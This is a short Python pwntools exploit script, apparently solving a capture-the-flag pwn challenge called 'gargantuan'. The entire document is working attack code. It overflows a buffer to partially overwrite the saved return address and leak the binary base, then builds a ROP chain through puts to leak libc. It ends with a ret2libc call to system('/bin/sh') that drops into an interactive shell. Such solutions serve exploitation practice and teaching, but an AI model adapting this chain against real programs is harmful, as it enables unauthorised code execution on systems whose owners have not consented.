from pwn import *

exe = ELF("./gargantuan_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.35.so")
context.binary = exe

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)

def overwrite(rip):
    for i in range(4):
        payload = p8(0xff - i) * 0x100 + b"\x00" + p8(0xff - i) * (0x100 - 1)
        p_s(payload)
    # overwrite saved rip
    payload = p8(0xff - 4) * 0x100 + b"\x00" + b"A" * (0x28 - 1) + rip
    p_s(payload)


'''
read
'''
script = '''
brva 0x122A
''' 

#p = gdb.debug("./gargantuan_patched", gdbscript = script)
p = process("./gargantuan_patched")
#debug()

# ret2main (partial overwrite)
overwrite(p8(0x6))
p_recvut(b"TOO LATE! ")
code_base = int(p.recvline(), 16) - exe.symbols['gargantuan']
print(hex(code_base))

pop_rdi = code_base + 0x00000000000011e0
ret = pop_rdi + 1
puts_plt = code_base + exe.plt['puts']
puts_got = code_base + exe.got['puts']
main = code_base + 0x1306

# rop leak libc and ret2main
overwrite(p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(ret) + p64(main))
p_recvut(b"TOO LATE! ")
p.recvline()
libc_base = u64(p.recv(6).ljust(8, b"\x00")) - libc.symbols['puts']
print(hex(libc_base))

# ret2libc
binsh = libc_base + list(libc.search(b"/bin/sh\x00"))[0]
system = libc_base + libc.symbols['system']
overwrite(p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system))

p.interactive()